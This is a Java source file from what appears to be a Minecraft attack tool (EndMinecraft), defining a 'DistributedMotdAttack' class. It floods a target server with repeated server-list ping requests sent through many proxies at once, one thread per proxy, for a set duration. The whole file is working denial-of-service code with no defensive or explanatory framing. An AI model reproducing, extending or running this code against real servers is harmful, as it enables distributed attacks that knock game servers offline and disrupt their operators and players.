package me.alikomi.endminecraft.tasks.attack;

import ch.jamiete.mcping.MinecraftPingOptions;
import ch.jamiete.mcping.MinecraftPingWithOutPing;
import me.alikomi.endminecraft.utils.Util;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class DistributedMotdAttack extends Util {

    private static String ip;
    private static int port;
    private static long time;
    private static int sleepTime;
    private Map<String, Proxy.Type> ips;
    private static Lock ipsLock = new ReentrantLock();
    private static boolean isAttack = true;
    private List<Thread> threads = new ArrayList<>();

    public DistributedMotdAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips) {
        this.ip = ip;
        this.port = port;
        this.time = time;
        this.sleepTime = sleepTime;
        this.ips = ips;
    }

    public boolean startAttack() {
        log(ips);
        log("代理数量： " +ips.size());
        log("正在初始化");
        ips.forEach((k, v) -> {
            if (k.contains(":")) {
                threads.add(new Thread(() -> start(k, v)));
            }
        });
        log("初始化完毕，正在启动");
        threads.forEach(Thread::start);
        clearThread();

        try {
            Thread.sleep(time);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        threads.forEach((v) -> {
            if (v != null && v.isAlive()) {
                v.stop();
            }
        });
        threads = null;
        isAttack = false;
        return true;

    }

    private void start(String pip, Proxy.Type tp) {
        Proxy proxy = new Proxy(tp, new InetSocketAddress(pip.split(":")[0], Integer.parseInt(pip.split(":")[1])));
        while (isAttack) {
            try {
                new MinecraftPingWithOutPing().getPing(new MinecraftPingOptions().setHostname(ip).setPort(port).setProxy(proxy));
            } catch (Exception e) {
                ipsLock.lock();
                ips.remove(pip);
            }
            try {
                Thread.sleep(sleepTime);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private void clearThread() {
        new Thread(() -> {
            while (isAttack) {
                List<Thread> list = new ArrayList<>();
                try {
                    threads.forEach((v) -> {
                        if (v != null) {
                            if (!v.isAlive()) {
                                list.add(v);
                            }
                        } else {
                            list.add(v);
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
                log("清理了：" + list.size() + " 个线程");
                threads.removeAll(list);
                System.gc();
                try {
                    Thread.sleep(2700);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

}
